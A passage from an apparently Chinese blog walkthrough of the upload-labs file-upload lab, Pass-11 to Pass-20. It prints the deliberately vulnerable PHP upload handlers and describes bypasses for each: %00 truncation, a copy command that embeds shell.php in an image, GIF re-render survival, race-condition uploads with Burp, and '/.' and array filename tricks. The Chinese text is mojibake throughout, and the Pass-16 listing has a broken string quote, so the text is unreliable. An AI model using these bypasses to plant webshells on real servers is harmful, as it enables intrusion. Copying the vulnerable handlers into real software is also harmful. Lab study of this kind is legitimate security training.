<p>çœ‹åˆ°æ˜¯ç™½åå•åˆ¤æ–­ï¼Œä½†æ˜¯<code>$img_path</code>ç›´æ¥æ‹¼æ¥ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨<code>%00æˆªæ–­</code>ç»•è¿‡ï¼š<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t7yca6j30js0cb0tc.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t7yca6j30js0cb0tc.jpg" class="lazyload" title="test"></a><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t7zx1hj30fb06yjrn.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e2t7zx1hj30fb06yjrn.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="Pass-12-ç•¥"><a href="#Pass-12-ç•¥" class="headerlink" title="Pass-12 ç•¥"></a>Pass-12 ç•¥</h2><p>æŠŠ <code>Pass-11</code> çš„GETæ”¹æˆPOST</p>
<h2 id="Pass-13-16-åˆç†åˆ©ç”¨å›¾ç‰‡æœ¨é©¬"><a href="#Pass-13-16-åˆç†åˆ©ç”¨å›¾ç‰‡æœ¨é©¬" class="headerlink" title="Pass-13-16 åˆç†åˆ©ç”¨å›¾ç‰‡æœ¨é©¬"></a>Pass-13-16 åˆç†åˆ©ç”¨å›¾ç‰‡æœ¨é©¬</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å‡ºé”™ï¼"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>ä½¿ç”¨ä¸‹é¢è¿™ä¸ªè¯­å¥ç„¶åä¼ å›¾ç‰‡é©¬</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy shell.jpg &#x2F;b + shell.php &#x2F;a muma.jpg</span><br></pre></td></tr></table></figure></div>

<hr>
<h2 id="Pass-16-äºŒæ¬¡æ¸²æŸ“ç»•è¿‡"><a href="#Pass-16-äºŒæ¬¡æ¸²æŸ“ç»•è¿‡" class="headerlink" title="Pass-16 äºŒæ¬¡æ¸²æŸ“ç»•è¿‡"></a>Pass-16 äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">'/'</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg);</span></span><br><span class="line"><span class="string">                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line"><span class="string">                $img_path = UPLOAD_PATH.'/'.$newfilename;</span></span><br><span class="line"><span class="string">                imagejpeg($im,$img_path);</span></span><br><span class="line"><span class="string">                @unlink($target_path);</span></span><br><span class="line"><span class="string">                $is_upload = true;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            $msg = "</span>ä¸Šä¼ å‡ºé”™ï¼<span class="string">";</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125;else if(($fileext == "</span>png<span class="string">") &amp;&amp; ($filetype=="</span>image/png<span class="string">"))&#123;</span></span><br><span class="line"><span class="string">        if(move_uploaded_file($tmpname,$target_path))&#123;</span></span><br><span class="line"><span class="string">            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line"><span class="string">            $im = imagecreatefrompng($target_path);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            if($im == false)&#123;</span></span><br><span class="line"><span class="string">                $msg = "</span>è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼<span class="string">";</span></span><br><span class="line"><span class="string">                @unlink($target_path);</span></span><br><span class="line"><span class="string">            &#125;else&#123;</span></span><br><span class="line"><span class="string">                 //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line"><span class="string">                srand(time());</span></span><br><span class="line"><span class="string">                $newfilename = strval(rand())."</span>.png<span class="string">";</span></span><br><span class="line"><span class="string">                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line"><span class="string">                $img_path = UPLOAD_PATH.'/'.$newfilename;</span></span><br><span class="line"><span class="string">                imagepng($im,$img_path);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                @unlink($target_path);</span></span><br><span class="line"><span class="string">                $is_upload = true;               </span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            $msg = "</span>ä¸Šä¼ å‡ºé”™ï¼<span class="string">";</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125;else if(($fileext == "</span>gif<span class="string">") &amp;&amp; ($filetype=="</span>image/gif<span class="string">"))&#123;</span></span><br><span class="line"><span class="string">        if(move_uploaded_file($tmpname,$target_path))&#123;</span></span><br><span class="line"><span class="string">            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡</span></span><br><span class="line"><span class="string">            $im = imagecreatefromgif($target_path);</span></span><br><span class="line"><span class="string">            if($im == false)&#123;</span></span><br><span class="line"><span class="string">                $msg = "</span>è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼<span class="string">";</span></span><br><span class="line"><span class="string">                @unlink($target_path);</span></span><br><span class="line"><span class="string">            &#125;else&#123;</span></span><br><span class="line"><span class="string">                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å</span></span><br><span class="line"><span class="string">                srand(time());</span></span><br><span class="line"><span class="string">                $newfilename = strval(rand())."</span>.gif<span class="string">";</span></span><br><span class="line"><span class="string">                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰</span></span><br><span class="line"><span class="string">                $img_path = UPLOAD_PATH.'/'.$newfilename;</span></span><br><span class="line"><span class="string">                imagegif($im,$img_path);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                @unlink($target_path);</span></span><br><span class="line"><span class="string">                $is_upload = true;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; else &#123;</span></span><br><span class="line"><span class="string">            $msg = "</span>ä¸Šä¼ å‡ºé”™ï¼<span class="string">";</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">        $msg = "</span>åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼<span class="string">";</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>åˆ¤æ–­äº†åç¼€åã€<code>content-type</code>ï¼Œä»¥åŠåˆ©ç”¨<code>imagecreatefromgif</code>åˆ¤æ–­æ˜¯å¦ä¸ºgifå›¾ç‰‡ï¼Œæœ€åå†åšäº†ä¸€æ¬¡äºŒæ¬¡æ¸²æŸ“ï¼Œç»•è¿‡æ–¹æ³•å¯ä»¥å‚è€ƒå…ˆçŸ¥çš„æ–‡ç« ï¼Œå†™çš„å¾ˆè¯¦ç»†ï¼š<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a><br>jpgå’Œpngå¾ˆéº»çƒ¦ï¼Œgifåªéœ€è¦æ‰¾åˆ°æ¸²æŸ“å‰åæ²¡æœ‰å˜åŒ–çš„ä½ç½®,ç„¶åå°†phpä»£ç å†™è¿›å»,å°±å¯ä»¥äº†ã€‚<br>ä»¿ç…§ä¸Šæ–¹ç›´æ¥ä½¿ç”¨gifå›¾ç‰‡é©¬ï¼Œç„¶åæŒ‚èœåˆ€å°±å¥½äº†<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm45xoj30lw0d13zj.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm45xoj30lw0d13zj.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="Pass-17-æ¡ä»¶ç«äº‰"><a href="#Pass-17-æ¡ä»¶ç«äº‰" class="headerlink" title="Pass-17 æ¡ä»¶ç«äº‰"></a>Pass-17 æ¡ä»¶ç«äº‰</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>å…³é”®è¯­å¥</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];&#x2F;&#x2F;å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶çš„ä¸´æ—¶å‰¯æœ¬çš„åç§°</span><br></pre></td></tr></table></figure></div>

<p>å½“æˆ‘ä»¬ä¸Šä¼ web shellæ–‡ä»¶æ—¶ï¼Œä¸ä¼šå…ˆé™åˆ¶phpç±»å‹æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆåˆ©ç”¨ä¸Šé¢çš„è¯­å¥æŠŠä¸Šä¼ çš„æ–‡ä»¶ä¸´æ—¶å­˜æ”¾ã€‚å†æ‰§è¡Œä¸‹é¢çš„ifè¯­å¥è¿›è¡Œæ–‡ä»¶ç±»å‹çš„é™åˆ¶å’Œæ–‡ä»¶åçš„æ—¶é—´æˆ³ã€‚<br>ç„¶åæ‰§è¡Œ<code>if(move_uploaded_file($temp_file, $upload_file))</code>//ç§»åŠ¨åˆ°æ–°æ–‡ä»¶å¤¹</p>
<p>ç»•è¿‡æ€è·¯æ˜¯åˆ©ç”¨ä»£ç æ‰§è¡Œè¿‡ç¨‹æœ‰è€—è´¹æ—¶é—´çš„è¿‡ç¨‹ã€‚ä¸´æ—¶webshellæ–‡ä»¶ä¿å­˜çš„æçŸ­æ—¶é—´ï¼Œå»è®¿é—®webshellã€‚è·å–ä¸€äº›ä¿¡æ¯</p>
<p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨burpå¤šçº¿ç¨‹å‘åŒ…ï¼Œç„¶åä¸æ–­åœ¨æµè§ˆå™¨è®¿é—®æˆ‘ä»¬çš„webshellã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm4v9oj30tw0gr40r.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm4v9oj30tw0gr40r.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="Pass-18-å›¾ç‰‡é©¬ç»“åˆæ¡ä»¶ç«äº‰"><a href="#Pass-18-å›¾ç‰‡é©¬ç»“åˆæ¡ä»¶ç«äº‰" class="headerlink" title="Pass-18 å›¾ç‰‡é©¬ç»“åˆæ¡ä»¶ç«äº‰"></a>Pass-18 å›¾ç‰‡é©¬ç»“åˆæ¡ä»¶ç«äº‰</h2><p>æ€è·¯å¦‚ä¸Š åªæ˜¯è¿™æ¬¡å¤šäº†äº›åˆ¤æ–­æ¡ä»¶ï¼Œæ¯”å¦‚å¯¹æ–‡ä»¶åç¼€ååšäº†ç™½åå•åˆ¤æ–­ï¼Œç„¶åä¼šä¸€æ­¥ä¸€æ­¥æ£€æŸ¥æ–‡ä»¶å¤§å°ã€æ–‡ä»¶æ˜¯å¦å­˜åœ¨ç­‰ç­‰ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åï¼Œå¯¹æ–‡ä»¶é‡æ–°å‘½åï¼ŒåŒæ ·å­˜åœ¨æ¡ä»¶ç«äº‰çš„æ¼æ´ã€‚ä¸æ–­åˆ©ç”¨burpå‘é€ä¸Šä¼ å›¾ç‰‡é©¬çš„æ•°æ®åŒ…ï¼Œç”±äºæ¡ä»¶ç«äº‰ï¼Œç¨‹åºä¼šå‡ºç°æ¥ä¸åŠrenameçš„é—®é¢˜ï¼Œä»è€Œä¸Šä¼ æˆåŠŸã€‚</p>
<hr>
<h2 id="Pass-19-ç»•è¿‡"><a href="#Pass-19-ç»•è¿‡" class="headerlink" title="Pass-19 /.ç»•è¿‡"></a>Pass-19 /.ç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm3v0sj30ee094dfy.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm3v0sj30ee094dfy.jpg" class="lazyload" title="test"></a></p>
<p><code>move_uploaded_file</code>ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„<code>/.</code>ã€‚ä½†æ˜¯Pass9ä¸­çš„æ–‡ä»¶åæ˜¯ä»<code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code>ä¸­è·å–çš„ï¼Œè¿™é‡Œæ˜¯ç”¨æˆ·å¯æ§çš„ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm6gavj30ua0dhwj5.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g1e6jm6gavj30ua0dhwj5.jpg" class="lazyload" title="test"></a><br>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨<code>move_uploaded_file</code>å‡½æ•°çš„00æˆªæ–­æ¼æ´ç»•è¿‡ã€‚</p>
<hr>
<h2 id="Pass-20-æ•°ç»„-ç»•è¿‡"><a href="#Pass-20-æ•°ç»„-ç»•è¿‡" class="headerlink" title="Pass-20 æ•°ç»„+ /. ç»•è¿‡"></a>Pass-20 æ•°ç»„+ /. ç»•è¿‡</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">'upload_file'</span>]))&#123;</span><br><span class="line">    <span class="comment">//æ£€æŸ¥MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">'image/jpeg'</span>,<span class="string">'image/png'</span>,<span class="string">'image/gif'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">"ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//æ£€æŸ¥æ–‡ä»¶å</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">"ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!"</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">"æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼"</span>;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">"æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">"è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥å‘ç°<code>$file_name</code>ç»è¿‡<code>reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>å¤„ç†ã€‚</p>
<p>å¦‚æœä¸Šä¼ çš„æ˜¯æ•°ç»„çš„è¯ï¼Œä¼šè·³è¿‡<code>$file = explode(&#39;.&#39;, strtolower($file));</code>ã€‚<br>å¹¶ä¸”åç¼€æœ‰ç™½åå•è¿‡æ»¤</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ext &#x3D; end($file);</span><br><span class="line">$allow_suffix &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);</span><br></pre></td></tr></table></figure></div>

